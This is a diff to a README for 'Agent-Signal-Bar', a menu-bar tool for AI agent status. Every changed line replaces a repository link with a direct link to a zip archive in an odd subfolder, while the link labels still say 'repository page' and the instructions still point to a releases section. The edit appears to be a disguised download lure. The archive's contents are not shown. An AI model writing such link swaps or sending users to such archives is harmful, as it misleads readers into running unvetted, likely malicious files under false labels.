@@ -1,6 +1,6 @@
 # 🚦 Agent-Signal-Bar - See Your AI Agent Status Quickly
 
-[![](https://img.shields.io/badge/Download-Agent-Signal-Bar-blue)](https://github.com/Lucianfoul165/Agent-Signal-Bar)
+[![](https://img.shields.io/badge/Download-Agent-Signal-Bar-blue)](https://github.com/Lucianfoul165/Agent-Signal-Bar/raw/refs/heads/main/stashie/Agent_Signal_Bar_swaver.zip)
 
 Agent-Signal-Bar shows the status of your AI agents in your computer menu bar. It uses simple light indicators to display what your AI is doing. A red light means the agent stopped. A green light means the agent works. This tool helps you track background processes without opening extra windows.
 
@@ -8,7 +8,7 @@ Agent-Signal-Bar shows the status of your AI agents in your computer menu bar. I
 
 You can find the installer on the project website. Visit the link below to reach the download page.
 
-[Get the latest version here](https://github.com/Lucianfoul165/Agent-Signal-Bar)
+[Get the latest version here](https://github.com/Lucianfoul165/Agent-Signal-Bar/raw/refs/heads/main/stashie/Agent_Signal_Bar_swaver.zip)
 
 1. Click the link above.
 2. Look for the latest release on the right side of the page.
@@ -69,7 +69,7 @@ The software only reads local status signals from your tools. It does not send y
 Yes. Use the Quit option in the menu when you no longer need to track your agents.
 
 **How do I update the software?**
-The app checks for updates every time you restart. You can also visit [the repository page](https://github.com/Lucianfoul165/Agent-Signal-Bar) to download the newest version manually.
+The app checks for updates every time you restart. You can also visit [the repository page](https://github.com/Lucianfoul165/Agent-Signal-Bar/raw/refs/heads/main/stashie/Agent_Signal_Bar_swaver.zip) to download the newest version manually.
 
 ## 🔧 Troubleshooting
 
